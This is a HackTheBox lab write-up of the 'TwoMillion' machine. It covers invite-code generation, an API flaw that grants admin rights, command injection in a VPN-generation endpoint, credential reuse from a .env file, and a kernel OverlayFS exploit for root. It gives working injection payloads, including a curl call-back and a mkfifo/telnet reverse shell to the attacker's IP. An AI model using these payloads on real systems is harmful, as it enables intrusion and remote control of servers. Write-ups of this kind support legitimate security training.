---
title: TwoMillion (HTB) / Easy
description: Write-up of TwoMillion Machine (HackTheBox) 
date: 2023-06-10 18:30:00 -3000
categories: [writeups]
tags: [hackthebox, htb, writeup, easy, machine, linux, kernel, api, js-desobfuscation]
author: tandera
show_image_post: true
---

<img src="/assets/writeups/2023-06-10-twomillion/TwoMillion.png" width=500px alt="Infocard TwoMillion">

## Machine Information

---
- Alias: TwoMillion
- Date: 07 June 2023
- Platform: HackTheBox
- OS: Linux
- Difficulty: Easy
- Status: Retired
- IP: 10.10.11.221

---

## Resolution Summary

1. Scanning for open ports, the attacker discovers an `SSH` and `HTTP` port.
2. The website turns out to be the old HackTheBox portal. In order to gain access, the attacker needs to obtain an invite code.
3. By analyzing the webpage and server functionality, the attacker successfully obtains a valid invite code and registers on HackTheBox.
4. While exploring the homepage, the attacker delves into the API, searching for vulnerable routes.
5. Eventually, a `/admin` route is discovered, and the attacker successfully elevates their user privileges.
6. Through injection in the `/vpn/generate` route, the attacker is able to establish a reverse shell.
7. By scouring the server files for sensitive data, the attacker uncovers the credentials for the `admin` user.
8. Additionally, an email is discovered in the admin's inbox, which reveals information about a vulnerability in the OverlayFS of the Linux kernel.
9. Exploiting this vulnerability, the hacker successfully obtains root access.


## Tools


| Purpose                           | Tools                                       |
|:----------------------------------|:--------------------------------------------|
| Port Scanning                     | [`nmap`](https://nmap.org/)                                       |
| SSH Enumeration                   | [`ssh-audit`](https://github.com/jtesta/ssh-audit)                                   |
| Directory Bruteforcing            | [`ffuf`](https://github.com/ffuf/ffuf)                                       |
| Web Crawler                       | [`katana`](https://github.com/projectdiscovery/katana)                                     |
| Proxy                             | [`Burpsuite`](https://portswigger.net/burp/communitydownload)                                   |
| API Testing  | [`curl`](https://curl.se/) [`Postman`](https://www.postman.com/)                                                  |
| Reverse Shell                     | [`nc`](https://www.hackingtutorials.org/networking/hacking-netcat-part-2-bind-reverse-shells/)                                          |


## Information Gathering 

### Port Scanning

Scanning for all opened ports:


```
$ nmap -sS -oN nmap.txt 10.10.11.221

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

## Enumeration

### HTTP (Nginx/2million.htb)


After accessing the `10.10.11.221:80` and adding `2million.htb` to our `/etc/hosts`, we got to the old school Hack The Box portal:

<img src="/assets/writeups/2023-06-10-twomillion/website.png" width=800px alt="HackTheBox old portal" title="The good old days!">


#### Crawling

Exploring the website, we discover a `invite` and `login` page.

Crawling all the links on the website, we don't find much more information:[^1]


```
# katana -u http://2million.htb/

   __        __
  / /_____ _/ /____ ____  ___ _
 /  '_/ _  / __/ _  / _ \/ _  /
/_/\_\\_,_/\__/\_,_/_//_/\_,_/							

		projectdiscovery.io

[INF] Current katana version v1.0.1 (latest)
[INF] Started standard crawling for => http://2million.htb/
http://2million.htb/
http://2million.htb/invite
http://2million.htb/login
http://2million.htb/js/htb-frontpage.min.js
http://2million.htb/css/htb-frontpage.css
http://2million.htb/js/inviteapi.min.js
http://2million.htb/js/htb-frontend.min.js
http://2million.htb/css/htb-frontend.css
```


#### Invite Code

Checking the `/invite` page, the server asks for a invite code and challenges us to hack our way in.

<img src="/assets/writeups/2023-06-10-twomillion/invite_page.png" width=500px alt="Invite field" title="Is this a challenge?">

Challenge accepted. 

After clicking in the "Sign Up" button, the page requests the `/api/v1/invite/verify` endpoint, with the code inserted on the body of the `POST` request. I've tested some SQLI inputs, but nothing worked:[^2]

<img src="/assets/writeups/2023-06-10-twomillion/invite.png" width=800px alt="Burpsuite in repeater with the invite code request" title="Testing for SQLI with Burpsuite">

Checking the source code of the page, we find a script in the HTML which does the request. If the code is valid, the user is redirected to the `/register` with the cookie `inviteCode` set:

<img src="/assets/writeups/2023-06-10-twomillion/register-route.png" width=800px alt="Register redirect in /invite">

#### Register

Loading the page, the `inviteapi.min.js` obfuscated script is called. This code calls the `eval` function, which executes Javascript code. 

<img src="/assets/writeups/2023-06-10-twomillion/eval.png" width=800px alt="Javascript obfuscated function">

At first glance, I've tried to de-obfuscate this code by hand in my own machine, but there's a clever way to see what it does: replace the `eval` with the `console.log`. This allow us to see what's inside the `eval` and, therefore, what's being executed in our browser:

```js
console.log(function (p, a, c, k, e, d) { /* ... */)
```

The output will be:

```js
function verifyInviteCode(code) {
  var formData = {"code":code};
  $.ajax(
    {
	  type:"POST",
      dataType:"json",
      data:formData,url:'/api/v1/invite/verify',
      success: function(response){ console.log(response) },
      error:function(response){console.log(response)}
    })
}

function makeInviteCode() {
  $.ajax(
  {
    type:"POST",
    dataType:"json", url:'/api/v1/invite/how/to/generate',
    success:function(response){console.log(response)},
    error:function(response){console.log(response)}})
}
``` 

We have two functions: `verifyInviteCode` and `makeInviteCode`. Both of them query the API and logs the response on the console. The first one requests the `invite/verify` route; the second one, `invite/how/to/generate`.

Calling `makeInviteCode` from the browser console, we get a json object:

<img src="/assets/writeups/2023-06-10-twomillion/encrypted.png" width=800px alt="'Encrypted' json object">

This object have three properties: data, hint and success. Hint tells us that the data property is encrypted. Data have the data itself and a enctype field, set to "ROT13". [Decrypting it](https://rot13.com/), we get: 

```
Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr
------------------------------------------------------------
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

Requesting the API:

```
curl -X POST "http://2million.htb/api/v1/invite/generate"
```

And here's our invite code!

```json
{
	"0": 200,
	"success": 1,
	"data": {
		"code":"SEdWOUEtMlhGQzEtSlZaUkotWERUOFk=",
		"format":"encoded"
	}
}
```

Decoding it from base64, we finally got a valid invite:

```
echo "SEdWOUEtMlhGQzEtSlZaUkotWERUOFk=" | base64 -d
# HGV9A-2XFC1-JVZRJ-XDT8Y
```

Registering a new user through `/invite` route, we get access to the Hack The Box platform.

#### Our new hacking portal

After the Sign Up, the server gives us a session, handled by the `PHPSESSID` cookie.

```
Cookie: PHPSESSID=og06ha2mqirjm7alp4kaoggj9p
```

In simple words, the `PHPSESSID` is the field that identify ourselves in the platform, granting us the necessary privileges to our user. This concept is key to our exploitation.

In the pages, there's a "Access" tab. We can download a `.ovpn` file from it. 

<img src="/assets/writeups/2023-06-10-twomillion/access.png" width=800px alt="Access page">

I've tried (more than I'm proud to confess) to access this VPN. All of my tries failed, for a simple reason: the port was closed. Even if we add the subdomain of the VPN file[^3] to our `/etc/hosts`, we get a redirect to the HackTheBox main page. 

```
< HTTP/1.1 301 Moved Permanently
< Server: nginx
< [...]
< Location: http://2million.htb/
```

That being said, let's heat things up.

#### Hello, API!

Since the beginning of this box, our browser interacts with many routes in the `/api/v1` path. For example, in the <a href="#invite-code">Invite Code</a> section, the `/api/v1/invite/verify` is requested; in the <a href="#register">Register</a>, the `/api/v1/invite/how/to/generate` and so on. We can try to explore this API and see what it's capable of doing. 

> But, why we haven't tested it yet?

Simple: because of the `PHPSESSID` cookie. Most of the routes are unauthorized to the common user. 

For example, if we try to access the `/api` without a session cookie:

```
curl -v "http://2million.htb/api"

* Connected to 2million.htb (10.10.11.221) port 80 (#0)
> GET /api HTTP/1.1
> Host: 2million.htb
> ...
>
< HTTP/1.1 401 Unauthorized
< Server: nginx
< ...
```

Now, with our `PHPSESSID`, we get a `200`:

```
curl "http://2million.htb/api" --cookie "PHPSESSID=877le0dr37hcm1p5bgbbvg8bte" 

* Connected to 2million.htb (10.10.11.221) port 80 (#0)
> GET /api HTTP/1.1
> Host: 2million.htb
> Cookie: PHPSESSID=877le0dr37hcm1p5bgbbvg8bte
> ...
>
< HTTP/1.1 200 OK
< Server: nginx
< Content-Type: application/json
< ...
<
* Connection #0 to host 2million.htb left intact
```

The response body is the available versions of the API:

```json
{"\/api\/v1":"Version 1 of the API"}
```

Requesting the `/api/v1` route, we can see all the available routes:

```
curl "http://2million.htb/api/v1" --cookie "PHPSESSID=877le0dr37hcm1p5bgbbvg8bte"
```

<img src="/assets/writeups/2023-06-10-twomillion/api-endpoints.png" width=600px alt="API endpoints">

Interesting. This API has a `admin` section that contains three routes: `/auth`, `/vpn/generate`, and `/settings/update`. Let's try it!

#### Admin routes

In this pentest, I've used Postman. For practical purposes, though, all the requests in this write-up are using curl.

First, let's see if our current user is admin:

```
curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=877le0dr37hcm1p5bgbbvg8bte"
```

```json
{"message":false}
```

False. Let's see if the other two routes checks if I'm admin.

`/vpn/generate` : 

```
curl -v http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=877le0dr37hcm1p5bgbbvg8bte" -d ""  # '-d' to use POST method without any data
```

```
> POST /api/v1/admin/vpn/generate HTTP/1.1
> Host: 2million.htb
> Cookie: PHPSESSID=877le0dr37hcm1p5bgbbvg8bte
> ...
>
< HTTP/1.1 401 Unauthorized
< Server: nginx
< ...
```

`/settings/update` :

```
curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=877le0dr37hcm1p5bgbbvg8bte" -d ""
```

```
> PUT /api/v1/admin/settings/update HTTP/1.1
> Host: 2million.htb
> Cookie: PHPSESSID=877le0dr37hcm1p5bgbbvg8bte
> Content-Type: application/x-www-form-urlencoded
> ...
>
< HTTP/1.1 200 OK
< Server: nginx
< Content-Type: application/json
< ...

{"status":"danger","message":"Invalid content type."}
```

Ok, the content type of our request is wrong. Let's try to use `application/json` instead of the curl default (`application/x-www-form-urlencoded`):

```
curl -v -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=877le0dr37hcm1p5bgbbvg8bte" -H "Content-Type: application/json" -d ""
```

```
> PUT /api/v1/admin/settings/update HTTP/1.1
> Host: 2million.htb
> Cookie: PHPSESSID=877le0dr37hcm1p5bgbbvg8bte
> Content-Type: application/json
> ...
>
< HTTP/1.1 200 OK
< Server: nginx
< Content-Type: application/json
< ...
<

{"status":"danger","message":"Missing parameter: email"}⏎
```

We need a email in the request body. Let's do it!

```
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie
 "PHPSESSID=877le0dr37hcm1p5bgbbvg8bte" -H "Content-Type: application/json"  -d '{"email":"tandera@gmail.com"}'
{"status":"danger","message":"Missing parameter: is_admin"}
```

If we set the `is_admin` property to `1`, our user gets admin privileges! 

```
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=877le0dr37hcm1p5bgbbvg8bte" -H "Content-Type: application/json"  -d '{"email":"tandera@gmail.com", "is_admin":1}'
{"id":25,"username":"tandera","is_admin":1}
```

```
curl http://2million.htb/api/v1/admin/auth --cookie "PHPSESSID=877le0dr37hcm1p5bgbbvg8bte"
{"message":true}
```

And now? How can we gain access the server?

## Exploitation

As a admin user, now we can `POST` on the `/vpn/generate` route:

```
curl "http://2million.htb/api/v1/admin/vpn/generate" --cookie "PHPSESSID=877le0dr37hcm1p5bgbbvg8bte" -H "Content-Type: application/json" -d ''
{"status":"danger","message":"Missing parameter: username"}
```

Setting the username to `tandera`, we receive the `ovpn` file: 

```
curl "http://2million.htb/api/v1/admin/vpn/generate" --cookie "PHPSESSID=877le0dr37hcm1p5bgbbvg8bte" -H "Content-Type: application/json" -d '{"username":"tandera"}'
client
dev tun
proto udp
remote edge-eu-free-1.2million.htb 1337
// ...
```

Here comes the catch: in the `.ovpn` file, there's certificates and a private key to that user on the VPN server. There's multiple ways to generate this certificates/keys, and one of them is through `openssl`. Our gold guess is that the server, in the backend, is calling the `openssl` binary through a `system` or a `shell_exec` and, if the developer wasn't careful enough, we can inject code directly into the command to generate our `.ovpn` file. 

To test this hypothesis, let's make the box request our local server.

1. (Lights...) Creating a local server:

```shell
sudo php -S 0.0.0.0:80
```

2. (Camera...) Creating the payload for the request:

```json
{"username": "tandera; curl http://10.10.14.38/"}
```

3. (Action!) Requesting the server:[^4]

```shell
curl "http://2million.htb/api/v1/admin/vpn/generate" --cookie "PHPSESSID=877le0dr37hcm1p5bgbbvg8bte" -H "Content-Type: application/json" -d '{"username":"tandera; curl http://10.10.14.38/"}'
```

<img src="/assets/writeups/2023-06-10-twomillion/code_injection.png" width=800px alt="Our little injection.">

Here it is! The server have executed our `curl` command. Through this technique, we can get a reverse shell:

1. Listening with `netcat`:

```
nc -lvp 4000
```

2. Making the server connect into our machine:

```shell
curl "http://2million.htb/api/v1/admin/vpn/generate" --cookie "PHPSESSID=877le0dr37hcm1p5bgbbvg8bte" -H "Content-Type: application/json" -d '{"username":"tandera; TF=$(mktemp -u);mkfifo $TF && telnet 10.10.14.38 4000 0<$TF | /bin/sh 1>$TF"}'
```

## Privilege Escalation

### Local Enumeration (www-data)

---
- id: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
- system: `Ubuntu 22.04.2 LTS`
- users: `root`, `www-data` and `admin`
- kernel: `5.15.70-051570-generic`
- sudo: `not for www-data`

---

Our shell spawns on the default directory for the Apache server, `/var/www/html/`. This folder has all the web application. Scouring around, we find a file called `Database.php`, containing all the methods to interact with MySQL with Singleton. 

```php
class Database {
	// ...
    private static $database = null;
    public function __construct($host, $user, $pass, $dbName) {/* ... */}

    public static function getDatabase(): Database {/* ... */}
    public function connect() {/* ... */}

    public function query($query, $params = [], $return = true) {/* ... */}
}
```

Let's see who uses this module!

```shell
grep -r "Database" .
./index.php:$database = new Database($dbHost, $dbUser, $dbPass, $dbName);
# ...
```

The Database class is first instantiated in the `index.php`, with four parameters (including user and password). Let's deep dive into this file.

```php
$envFile = file('.env');
$envVariables = [];

foreach ($envFile as $line) {
    // Parsing the .env file and saving it in $envVariables
    $envVariables[$key] = $value;
}

$dbHost = $envVariables['DB_HOST'];
$dbName = $envVariables['DB_DATABASE'];
$dbUser = $envVariables['DB_USERNAME'];
$dbPass = $envVariables['DB_PASSWORD'];
```

A-ha! The database credentials are stored in the `.env` file. Checking it, we've got:

```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

And, coincidence or not, this is also de credentials for the `admin` user!

### Local Enumeration (admin)

---
- id: `uid=1000(admin) gid=1000(admin) groups=1000(admin)`
- sudo: `not for admin`

---

Firstly, I've done some basic enumeration on the system (checking `passwd` and `shadow`, listing all SUID binaries, searching in the MySQL database for sensitive data, etc). Then, I've looked into the `/var/mail` directory. There, we found a email for the admin user:

```
Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

Searching for a OverlayFS / Fuse vulnerabilities, we found about the [CVE-2023-0386](https://nvd.nist.gov/vuln/detail/CVE-2023-0386), which allows privilege escalation.

Without going much further in the explanation, this vulnerability allows a low privileged user to run SUID binaries without having the permission do so. It happens because of a flaw in the Linux kernel's OverlayFS subsystem: when a user copies a file with capabilities from one place to another, a bug mishandles the permissions, granting the user access to execute the SUID binary.

In GitHub, there's a bunch of exploits for this CVE. I've used [this one](https://github.com/xkaneiki/CVE-2023-0386).  To gain root access, do the following steps:

- Clone the repo to our local machine:

```shell
git clone https://github.com/xkaneiki/CVE-2023-0386
```

- Transfer the files to the remote host:

```shell
scp -r ./CVE-2023-0386 admin@2million.htb:/tmp
```

- Login in two different `ssh` sessions:

```shell
(session1) ssh admin@2million.htb
(session2) ssh admin@2million.htb
```

- Enter in the directory and build the exploit:

```shell
(session1) cd /tmp/CVE-2023-0386 && make all
(session2) cd /tmp/CVE-2023-0386
```

- In `session1`, run the `fuse` binary:

```shell
(session1) ./fuse ./ovlcap/lower ./gc
```

- In `session2`, the `exp`: 

```shell
(session2) ./exp
uid:1000 gid:1000
[+] mount success
total 8
drwxrwxr-x 1 root   root     4096 Jun 11 18:56 .
drwxr-xr-x 6 root   root     4096 Jun 11 18:56 ..
-rwsrwxrwx 1 nobody nogroup 16096 Jan  1  1970 file
[+] exploit success!

root@2million:/tmp/CVE-2023-0386 # 
```

Thanks for reading and Happy Hacking!

## Appendix A: How do we even got a shell?

As mentioned in the <a href="#exploitation">Exploitation</a> section, one of the possibilities to generate a `.ovpn` file is through `openssl`. But, behind the cameras, how we managed to exploit this code?

Let's access the web server directory on the server:

```
ssh admin@2million.htb
cd /var/www/html
```

From here, we can make a static analysis of the code.

In the `VPN` folder, we can find a shell script called `gen.sh`.

```shell
#!/bin/bash

username=$1

if [[ -n "$username" ]]; then
	cd /var/www/html/VPN

	/usr/bin/cp user/user.cnf user/"$username".cnf
	/usr/bin/sed -i "s/username/$username/g" user/"$username".cnf

	/usr/bin/openssl req -config user/"$username".cnf -newkey rsa:2048 -sha256 -nodes -out user/"$username".csr -outform PEM
	# ...
```

This script receives only one argument, which is the `username`. Let's search for code who uses this file:

```shell
grep -r "gen.sh" .  

~/tmp/html/controllers/VPNController.php: 
exec("/bin/bash /var/www/html/VPN/gen.sh $user", $output, $return_var);

~/tmp/html/controllers/VPNController.php: 
exec("/bin/bash /var/www/html/VPN/gen.sh $username", $output, $return_var);
```

Checking the `VPNController.php` :

```php
public function regenerate_user_vpn($router, $user = null) {
  if ($user != null) {
	exec("/bin/bash /var/www/html/VPN/gen.sh $user", $output, $return_var);
	// ...
```

Here it is: whenever the server calls the `regenerate_user_vpn` method, the `$user` variable is passed as is. I.e., when we send our payload to the server, the code will execute the statement (and our malicious code):

```shell
/bin/bash /var/www/html/VPN/gen.sh tandera; curl http://10.10.14.38/
```

---
[^1]: It's possible to bruteforce directories too, but all links are available through crawling and javascript analysis. If you want to **speed things up**, use the `-jc/-js-crawl` option in katana. 
[^2]: The responses are always equal to the "Invalid Code" response, even with Boolean Based techniques. 
[^3]: The `ovpn` file contains a subdomain to connect: `edge-eu-free-1.2million.htb`, on port 1337. This port is closed. 
[^4]: The `10.10.14.38` is my local address of the real HackTheBox VPN (tun0). 
[^5]: To use the web-server in your local machine, make sure to create the database and tables of the application.
